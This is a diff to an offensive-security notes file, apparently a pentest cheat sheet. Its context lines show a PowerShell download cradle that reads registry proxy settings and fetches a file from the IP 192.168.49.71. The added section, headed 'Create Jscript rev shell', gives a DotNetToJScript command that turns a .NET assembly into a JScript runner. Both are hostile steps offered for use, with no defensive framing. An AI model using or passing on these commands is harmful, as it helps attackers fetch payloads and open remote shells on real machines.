@@ -22,3 +22,7 @@ $proxyAddr=(Get-ItemProperty -Path "HKU:$start\Software\Microsoft\Windows\Curren
 $wc = new-object system.net.WebClient
 $wc.DownloadString("http://192.168.49.71/clip.txt")
 ```
+## Create Jscript rev shell
+```
+DotNetToJScript.exe ExampleAssembly.dll --lang=Jscript --ver=v4 -o runner.js
+```
